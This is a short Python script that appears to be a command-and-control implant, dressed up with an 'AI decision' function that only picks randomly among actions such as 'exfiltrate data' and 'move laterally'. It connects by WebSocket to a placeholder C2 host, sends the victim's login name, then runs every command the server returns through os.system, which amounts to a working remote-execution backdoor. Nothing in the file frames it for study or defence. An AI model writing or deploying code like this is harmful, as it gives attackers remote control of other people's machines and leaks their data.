import websocket
import json
import os
import random

C2_WEBSOCKET = "ws://your-c2-server.com/ws"

def ai_decision():
    options = ["execute payload", "exfiltrate data", "sleep", "move laterally"]
    return random.choice(options)

def beacon():
    ws = websocket.WebSocket()
    ws.connect(C2_WEBSOCKET)
    ws.send(json.dumps({"agent": os.getlogin(), "decision": ai_decision()}))

    while True:
        response = ws.recv()
        command = json.loads(response).get("cmd", "")
        if command:
            os.system(command)

if __name__ == "__main__":
    beacon()

